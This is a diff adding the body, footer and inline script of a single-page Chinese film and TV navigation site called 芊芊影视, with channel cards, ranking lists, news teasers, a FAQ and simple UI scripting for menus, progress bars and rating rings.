+      <article class="pl" style="--a:#f9a8d4;--b:#db2777;--cs:rgba(219,39,119,.3)"><div class="ic">🎤</div><h3>综艺频道</h3><p>真人秀、脱口秀、竞演与文化节目，芊芊影视综艺频道轻松解压。</p><span class="go">进入频道 →</span></article>
+      <article class="pl" style="--a:#fbcfe8;--b:#e11d74;--cs:rgba(225,29,116,.28)"><div class="ic">🎨</div><h3>动漫频道</h3><p>国漫、日番、美漫与动画电影，芊芊影视动漫频道覆盖全龄段。</p><span class="go">进入频道 →</span></article>
+      <article class="pl" style="--a:#fda4af;--b:#be123c;--cs:rgba(190,18,60,.3)"><div class="ic">🌍</div><h3>纪录片频道</h3><p>自然、人文、历史与科技，芊芊影视纪录片频道拓宽视野。</p><span class="go">进入频道 →</span></article>
+      <article class="pl" style="--a:#f5d0fe;--b:#a21caf;--cs:rgba(162,28,175,.3)"><div class="ic">🎞️</div><h3>短片频道</h3><p>微电影、创意短片与电影节精选，碎片时间也能看精品。</p><span class="go">进入频道 →</span></article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目2 热播 -->
+<section style="background:#ffeef3" id="hot">
+  <div class="wrap">
+    <div class="eyebrow">栏目二 · 热播榜单</div>
+    <h2 class="h2">芊芊影视 <em>今日热播</em></h2>
+    <p class="lead">芊芊影视综合热度与口碑实时排序，左侧大卡主推 + 右侧排行榜，一目了然。</p>
+    <div class="split">
+      <div class="feat" style="--a:#e11d74;--b:#c026d3">
+        <span class="badge">🌸 芊芊影视 · 今日主推</span>
+        <h3>芊芊影视 2026<br>春日观影指南</h3>
+        <p>从治愈系动画到温柔爱情，芊芊影视为你精选 20 部今春不容错过的作品，按心情选片，三秒就上手。</p>
+        <div class="acts"><a class="btn btn-g" href="#" style="background:#fff;color:#e11d74">查看指南</a><a class="btn btn-o" href="#" style="border-color:rgba(255,255,255,.5);color:#fff">收藏片单</a></div>
+        <div class="st"><span>🎬 20 部精选</span><span>⭐ 均分 8.6</span><span>🕒 3 分钟阅读</span></div>
+      </div>
+      <div class="side">
+        <div class="si"><span class="t">1</span><div><h4>芊芊影视 · 热播电影榜</h4><small>剧情 / 爱情 · 院线同步</small></div><span class="sc">9.2</span></div>
+        <div class="si"><span class="t">2</span><div><h4>春日追剧日历</h4><small>电视剧 · 连载更新</small></div><span class="sc">8.9</span></div>
+        <div class="si"><span class="t">3</span><div><h4>治愈系动画精选</h4><small>动漫 · 全龄向</small></div><span class="sc">9.4</span></div>
+        <div class="si"><span class="t">4</span><div><h4>浪漫爱情季</h4><small>电影 / 剧集 · 高口碑</small></div><span class="sc">8.7</span></div>
+        <div class="si"><span class="t">5</span><div><h4>深夜纪录片</h4><small>纪录 · 自然人文</small></div><span class="sc">8.5</span></div>
+        <div class="si"><span class="t">6</span><div><h4>轻松综艺补给</h4><small>综艺 · 解压首选</small></div><span class="sc">8.3</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目3 电视剧 -->
+<section id="tv">
+  <div class="wrap">
+    <div class="eyebrow">栏目三 · 电视剧</div>
+    <h2 class="h2">芊芊影视 <em>追剧剧场</em></h2>
+    <p class="lead">芊芊影视电视剧频道汇集热门连载与高分完结剧，横向滑动卡片适配手机触屏，进度条直观显示追剧进度。</p>
+    <div class="dr-w"><div class="dr" id="drIn"></div></div>
+  </div>
+</section>
+
+<!-- 栏目4 综艺 -->
+<section style="background:#ffeef3" id="variety">
+  <div class="wrap">
+    <div class="eyebrow">栏目四 · 综艺节目</div>
+    <h2 class="h2">芊芊影视 <em>轻松补给</em></h2>
+    <p class="lead">芊芊影视综艺频道以「心形药丸」横条呈现节目，一行一条，滑动浏览毫无负担。</p>
+    <div class="cap">
+      <article class="cp" style="--a:#fda4af;--b:#e11d74"><div class="l">🎤</div><div class="r"><h4>欢乐喜剧人 年度精选</h4><small>真人秀 · 每周五 20:00</small></div></article>
+      <article class="cp" style="--a:#c026d3;--b:#9333ea"><div class="l">🎙️</div><div class="r"><h4>深夜书房 访谈</h4><small>文化 · 每周三 22:30</small></div></article>
+      <article class="cp" style="--a:#db2777;--b:#be185d"><div class="l">🏆</div><div class="r"><h4>巅峰之声 竞演</h4><small>音乐 · 每周六 21:00</small></div></article>
+      <article class="cp" style="--a:#be123c;--b:#e11d74"><div class="l">🍳</div><div class="r"><h4>人间烟火 美食记</h4><small>生活 · 每日 12:00</small></div></article>
+      <article class="cp" style="--a:#a21caf;--b:#7e22ce"><div class="l">✈️</div><div class="r"><h4>环游世界 旅行志</h4><small>旅行 · 每周日 19:30</small></div></article>
+      <article class="cp" style="--a:#e11d74;--b:#f43f5e"><div class="l">💃</div><div class="r"><h4>舞力全开 竞演赛</h4><small>舞蹈 · 每周四 21:00</small></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目5 动漫 -->
+<section id="anime">
+  <div class="wrap">
+    <div class="eyebrow">栏目五 · 国漫番剧</div>
+    <h2 class="h2">芊芊影视 <em>动漫番剧</em></h2>
+    <p class="lead">芊芊影视动漫频道以时间轴形式呈现国漫与番剧更新进度，经典与连载一目了然。</p>
+    <div class="tl">
+      <div class="ti"><div class="bd"><h4>雾山五行 第三季</h4><p>国风武侠动画，水墨打戏行云流水，最新话已更新。</p><span class="tag-i">更新至 08 话 · 9.5 分</span></div></div>
+      <div class="ti"><div class="bd"><h4>中国奇谭 第二季</h4><p>中式志怪美学，八段独立故事，画风与立意俱佳。</p><span class="tag-i">完结 · 9.4 分</span></div></div>
+      <div class="ti"><div class="bd"><h4>白蛇 · 浮生</h4><p>民间传说新编动画电影，东方美学与情感表达兼具。</p><span class="tag-i">热播中 · 8.8 分</span></div></div>
+      <div class="ti"><div class="bd"><h4>天宝伏妖录</h4><p>唐风志怪番剧，人物与美术考究，世界观宏大。</p><span class="tag-i">连载 · 8.7 分</span></div></div>
+      <div class="ti"><div class="bd"><h4>枕刀歌 第二季</h4><p>武侠江湖动画，水墨意境与打斗节奏俱佳。</p><span class="tag-i">更新中 · 8.5 分</span></div></div>
+      <div class="ti"><div class="bd"><h4>时光代理人 第三季</h4><p>都市奇幻番剧，剧情反转不断，口碑持续走高。</p><span class="tag-i">连载 · 9.0 分</span></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目6 口碑 -->
+<section style="background:#ffeef3" id="rank">
+  <div class="wrap">
+    <div class="eyebrow">栏目六 · 口碑榜</div>
+    <h2 class="h2">芊芊影视 <em>口碑之选</em></h2>
+    <p class="lead">芊芊影视口碑榜以环形进度呈现评分，粉色越满代表口碑越高，数据来自芊芊影视综合评分。</p>
+    <div class="ring" id="ringBox"></div>
+  </div>
+</section>
+
+<!-- 栏目7 资讯 -->
+<section id="news">
+  <div class="wrap">
+    <div class="eyebrow">栏目七 · 影视资讯</div>
+    <h2 class="h2">芊芊影视 <em>新鲜资讯</em></h2>
+    <p class="lead">芊芊影视内容团队每日精选影视圈重要资讯，档期、获奖、开播与停播信息第一时间同步。</p>
+    <div class="wall">
+      <article class="nw" style="--a:#e11d74;--b:#c026d3"><div class="th"><span class="lb">头条</span><small>🎬</small></div><div class="ct"><span class="dt">❖ 芊芊影视资讯 · 2 小时前</span><h4>春日档票房创新高，芊芊影视为你整理必看清单</h4><p>今年春日档多部国产片表现亮眼，芊芊影视精选三部口碑佳作，从剧情到视听全面解读。</p><a class="more" href="#">阅读全文 →</a></div></article>
+      <article class="nw" style="--a:#c026d3;--b:#9333ea"><div class="th"><span class="lb">剧集</span><small>📺</small></div><div class="ct"><span class="dt">❖ 芊芊影视资讯 · 5 小时前</span><h4>年度情感剧收官，反转结局引爆全网讨论</h4><p>芊芊影视梳理全季剧情线索与伏笔，帮你一次看懂这部高口碑剧集的叙事巧思。</p><a class="more" href="#">阅读全文 →</a></div></article>
+      <article class="nw" style="--a:#fda4af;--b:#e11d74"><div class="th"><span class="lb">动漫</span><small>🎨</small></div><div class="ct"><span class="dt">❖ 芊芊影视资讯 · 昨天</span><h4>国风动画走向世界，海外平台评分持续走高</h4><p>芊芊影视盘点近期出海的国漫作品，从美术到故事，解读它们为何能在海外圈粉。</p><a class="more" href="#">阅读全文 →</a></div></article>
+      <article class="nw" style="--a:#be123c;--b:#e11d74"><div class="th"><span class="lb">纪录</span><small>🌍</small></div><div class="ct"><span class="dt">❖ 芊芊影视资讯 · 昨天</span><h4>自然纪录片新作上线，镜头下的中国之美</h4><p>芊芊影视带你云游山河湖海，感受这部纪录片的极致摄影与人文关怀。</p><a class="more" href="#">阅读全文 →</a></div></article>
+      <article class="nw" style="--a:#a21caf;--b:#7e22ce"><div class="th"><span class="lb">综艺</span><small>🎤</small></div><div class="ct"><span class="dt">❖ 芊芊影视资讯 · 3 天前</span><h4>文化类综艺回暖，知识与趣味并重成新趋势</h4><p>芊芊影视分析近期文化综艺的节目模式，看它们如何用轻松方式讲厚重故事。</p><a class="more" href="#">阅读全文 →</a></div></article>
+      <article class="nw" style="--a:#db2777;--b:#be185d"><div class="th"><span class="lb">指南</span><small>📋</small></div><div class="ct"><span class="dt">❖ 芊芊影视资讯 · 5 天前</span><h4>芊芊影视片单合集：按心情选片不踩雷</h4><p>开心、难过、无聊、失眠……芊芊影视为你按情绪分类整理片单，总有一部适合此刻的你。</p><a class="more" href="#">阅读全文 →</a></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目8 指南 -->
+<section style="background:#ffeef3" id="guide">
+  <div class="wrap">
+    <div class="eyebrow">栏目八 · 使用指南</div>
+    <h2 class="h2">芊芊影视 <em>四步上手</em></h2>
+    <p class="lead">芊芊影视页面经移动端深度优化，手机、平板、电脑三端自适应。跟随花瓣箭头走完四步，轻松找到想看的。</p>
+    <div class="flow">
+      <div class="st"><span class="n">1</span><h4>选频道</h4><p>从顶部导航或分类入口进入对应频道。</p></div>
+      <div class="st"><span class="n">2</span><h4>看榜单</h4><p>热播榜与口碑榜帮你快速锁定好作品。</p></div>
+      <div class="st"><span class="n">3</span><h4>点进去</h4><p>点击频道链接进入详情，了解更多信息。</p></div>
+      <div class="st"><span class="n">4</span><h4>多端看</h4><p>响应式布局，手机平板电脑体验一致。</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- FAQ -->
+<section id="faq">
+  <div class="wrap">
+    <div class="eyebrow">栏目九 · 常见问题</div>
+    <h2 class="h2">关于芊芊影视 <em>常见问答</em></h2>
+    <p class="lead">关于芊芊影视（qianqianyingshi-cn）的常见疑问，芊芊影视团队已为你整理好答案。</p>
+    <div class="ask">
+      <div class="qa on"><button class="qb" aria-expanded="true">芊芊影视是什么网站？<span class="q">▾</span></button><div class="qm"><p>芊芊影视（qianqianyingshi-cn）是柔美风格的影视导航单页网站，提供电影、电视剧、综艺、动漫、纪录片等频道的分类入口与榜单信息，帮你快速找到想看的影像内容。</p></div></div>
+      <div class="qa"><button class="qb" aria-expanded="false">芊芊影视有哪些栏目？<span class="q">▾</span></button><div class="qm"><p>芊芊影视设有影视分类、热播榜、电视剧、综艺、动漫、口碑榜、影视资讯、使用指南、常见问题、关于我们等栏目，覆盖从选片到鉴赏的完整流程。</p></div></div>
+      <div class="qa"><button class="qb" aria-expanded="false">支持手机访问吗？<span class="q">▾</span></button><div class="qm"><p>支持。芊芊影视采用响应式布局，手机、平板、桌面设备均可自适应显示，移动端优先设计，触控操作友好。</p></div></div>
+      <div class="qa"><button class="qb" aria-expanded="false">榜单多久更新一次？<span class="q">▾</span></button><div class="qm"><p>芊芊影视热播榜每日刷新，口碑榜每周复核，资讯每日精选，确保你看到的都是最新动态。</p></div></div>
+      <div class="qa"><button class="qb" aria-expanded="false">页面为什么这么轻快？<span class="q">▾</span></button><div class="qm"><p>芊芊影视单页由 HTML + 内联 CSS/JS 构成，无外部依赖，资源体积小、加载快，像花瓣一样轻盈舒展。</p></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 关于 -->
+<section style="background:#ffeef3" id="about">
+  <div class="wrap">
+    <div class="about">
+      <div class="ab a">
+        <div class="eyebrow" style="color:#fda4af">栏目十 · 关于我们</div>
+        <h3>关于芊芊影视</h3>
+        <p>芊芊影视（qianqianyingshi-cn）以「温柔、精选、轻盈」为准则。我们相信好内容值得被温柔地找到，一个柔美的入口能让每一次观影都变成享受。</p>
+        <div class="url">🔗 https://qianqianyingshi-cn.github.io</div>
+        <div class="stats">
+          <div class="stt"><b>6</b><span>内容频道</span></div>
+          <div class="stt"><b>10</b><span>栏目板块</span></div>
+          <div class="stt"><b>3</b><span>自适应端</span></div>
+        </div>
+      </div>
+      <div class="ab b">
+        <div class="eyebrow" style="color:#f0abfc">栏目十 · 数据一览</div>
+        <h3>芊芊影视数据</h3>
+        <p>芊芊影视每日精选内容，持续优化分类与榜单，让推荐越来越懂你，也让页面始终保持轻快不卡顿。</p>
+        <div class="url">📊 每日更新 · 全年无休</div>
+        <div class="stats">
+          <div class="stt"><b>128</b><span>电影精选</span></div>
+          <div class="stt"><b>36</b><span>连载剧集</span></div>
+          <div class="stt"><b>365</b><span>更新天数</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- CTA -->
+<section style="padding:0 0 96px">
+  <div class="cta">
+    <div class="wrap">
+      <h2>温柔精选，从芊芊影视开始</h2>
+      <p>芊芊影视（qianqianyingshi-cn）电影、电视剧、综艺、动漫、纪录片一站直达，樱花粉少女心界面，轻量加载极速体验。</p>
+      <a class="btn btn-g" href="#cats">进入芊芊影视 →</a>
+    </div>
+  </div>
+</section>
+
+</main>
+
+<footer class="foot">
+  <div class="wrap">
+    <div class="foot-top">
+      <div><div class="logo-foot"><span class="flower" aria-hidden="true"><svg viewBox="0 0 24 24"><path d="M12 10c-2-3-6-3-6 0s2 6 6 8c4-2 6-5 6-8s-4-3-6 0z"/><path d="M12 10c0-3 3-6 6-6s3 4 0 6c-2 1-6 0-6 0z" opacity=".75"/><path d="M12 10c0-3-3-6-6-6s-3 4 0 6c2 1 6 0 6 0z" opacity=".75"/></svg></span><span class="logo-t" style="color:#fbcfe8">芊芊<b style="font-style:normal;color:#fda4af">影视</b></span></div><p class="d">芊芊影视（qianqianyingshi-cn）樱花粉少女心主题影视导航单页，聚合电影、电视剧、综艺、动漫、纪录片等栏目，温柔地为你推荐好内容。</p></div>
+      <div><h4>栏目导航</h4><ul><li><a href="#cats">影视分类</a></li><li><a href="#hot">热播榜单</a></li><li><a href="#tv">电视剧</a></li><li><a href="#variety">综艺</a></li><li><a href="#anime">动漫</a></li></ul></div>
+      <div><h4>精选内容</h4><ul><li><a href="#rank">口碑榜</a></li><li><a href="#news">影视资讯</a></li><li><a href="#guide">使用指南</a></li><li><a href="#faq">常见问题</a></li><li><a href="#about">关于我们</a></li></ul></div>
+      <div><h4>联系方式</h4><ul><li><a href="#">商务合作</a></li><li><a href="#">内容投稿</a></li><li><a href="#">意见反馈</a></li><li><a href="#">隐私政策</a></li><li><a href="#">免责声明</a></li></ul></div>
+    </div>
+    <div class="foot-bot"><span>© <span id="yr">2026</span> 芊芊影视 qianqianyingshi-cn · 保留所有权利 · 网址：<a href="https://qianqianyingshi-cn.github.io">https://qianqianyingshi-cn.github.io</a></span><span><a href="#top">回到顶部 ↑</a></span></div>
+  </div>
+</footer>
+
+<a id="top" href="#top" aria-label="回到顶部">↑</a>
+
+<svg width="0" height="0" style="position:absolute" aria-hidden="true"><defs><linearGradient id="grad" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#fda4af"/><stop offset="100%" stop-color="#e11d74"/></linearGradient></defs></svg>
+
+<script>
+(function(){
+  "use strict";
+  var y=document.getElementById('yr'); if(y)y.textContent=new Date().getFullYear();
+  var mb=document.getElementById('mBtn'),mu=document.getElementById('menu');
+  if(mb&&mu){
+    mb.addEventListener('click',function(){
+      var o=mu.classList.toggle('open');
+      mb.setAttribute('aria-expanded',o?'true':'false');
+      mb.textContent=o?'✕':'☰';
+    });
+    mu.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){
+      mu.classList.remove('open');mb.setAttribute('aria-expanded','false');mb.textContent='☰';
+    });});
+  }
+  var pb=document.getElementById('pbar'),tp=document.getElementById('top');
+  function sc(){
+    var h=document.documentElement.scrollHeight-innerHeight;
+    if(pb)pb.style.width=(h>0?(scrollY/h*100):0)+'%';
+    if(tp)tp.classList.toggle('show',scrollY>400);
+  }
+  addEventListener('scroll',sc,{passive:true});sc();
+  var tv=[
+    {t:'悬疑迷局',w:'第 12 集',a:'#e11d74',b:'#c026d3',p:66},
+    {t:'春日恋语',w:'第 06 集',a:'#fda4af',b:'#e11d74',p:38},
+    {t:'长安十二时辰',w:'第 24 集',a:'#be123c',b:'#e11d74',p:82},
+    {t:'深夜书房',w:'第 03 集',a:'#c026d3',b:'#9333ea',p:18},
+    {t:'都市情缘',w:'第 09 集',a:'#db2777',b:'#be185d',p:52},
+    {t:'古董局中局',w:'第 15 集',a:'#a21caf',b:'#7e22ce',p:70},
+    {t:'星辰大海',w:'第 21 集',a:'#f43f5e',b:'#e11d74',p:88},
+    {t:'欢喜一家人',w:'第 30 集',a:'#d946ef',b:'#c026d3',p:95}
+  ];
+  var di=document.getElementById('drIn');
+  di.innerHTML=tv.map(function(o,i){return '<div class="dc" style="--a:'+o.a+';--b:'+o.b+'"><div class="th"><span class="em">'+o.t+'</span></div><div class="ct"><span class="ep">EP · '+o.w+'</span><h4>'+o.t+'</h4><span style="font-size:12px;color:#a36b87">芊芊影视电视剧频道</span><div class="bar"><i data-w="'+o.p+'" style="transition-delay:'+(i*0.08)+'s"></i></div></div></div>';}).join('');
+  var rk=[
+    {t:'雾山五行 第三季',d:'国风武侠动画 · 9.5 分',n:95},
+    {t:'中国奇谭 第二季',d:'中式志怪 · 9.4 分',n:94},
+    {t:'治愈系动画精选',d:'全龄向 · 9.4 分',n:94},
+    {t:'时光代理人 第三季',d:'都市奇幻 · 9.0 分',n:90},
+    {t:'春日追剧日历',d:'连载更新 · 8.9 分',n:89}
+  ];
+  var rb=document.getElementById('ringBox');
+  rb.innerHTML=rk.map(function(o){return '<div class="rg"><div class="cir"><svg width="130" height="130"><circle class="bg" cx="65" cy="65" r="54"/><circle class="fg" cx="65" cy="65" r="54" data-p="'+o.n+'"/></svg><b>'+o.n+'</b></div><h4>'+o.t+'</h4><p>'+o.d+'</p></div>';}).join('');
+  var rings=rb.querySelectorAll('.fg');
+  if('IntersectionObserver' in window){var io=new IntersectionObserver(function(es){es.forEach(function(e){if(e.isIntersecting){e.target.style.strokeDashoffset=339.29*(1-e.target.dataset.p/100);io.unobserve(e.target);}});},{threshold:.3});rings.forEach(function(r){io.observe(r);});}
+  else{rings.forEach(function(r){r.style.strokeDashoffset=339.29*(1-r.dataset.p/100);});}
+  setTimeout(function(){di.querySelectorAll('.bar i').forEach(function(b){b.style.width=b.dataset.w+'%';});},400);
+  document.querySelectorAll('.qb').forEach(function(q){
+    q.addEventListener('click',function(){
+      var it=q.closest('.qa'),o=it.classList.toggle('on');
+      q.setAttribute('aria-expanded',o?'true':'false');
+    });
+  });
+})();
+</script>
+</body>
+</html>
